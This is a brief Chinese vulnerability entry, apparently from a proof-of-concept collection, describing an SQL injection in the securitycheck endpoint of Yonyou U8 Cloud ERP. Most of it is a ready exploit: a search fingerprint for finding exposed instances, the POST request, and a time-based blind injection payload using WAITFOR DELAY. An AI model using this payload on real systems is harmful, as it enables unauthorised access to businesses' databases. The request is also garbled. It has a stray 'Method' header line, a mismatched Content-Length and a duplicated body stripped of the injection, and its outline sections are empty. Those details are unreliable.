# 用友U8Cloudsecuritycheck存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /yer/securitycheck HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Method: POST /yer/core HTTP/1.1`　`Content-Type: application/x-www-form-urlencoded;charset=UTF-8`　`Content-Length: 12`

**请求体 / payload**
```
userId=1';WAITFOR DELAY '0:0:5'--
POST /yer/securitycheck HTTP/1.1
Host: {hostname}
Method: POST /yer/core HTTP/1.1
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 12
userId=1

nuclei脚本\
\[用友-U8C-Cloud-securitycheck-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友U8 Cloud securitycheck存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud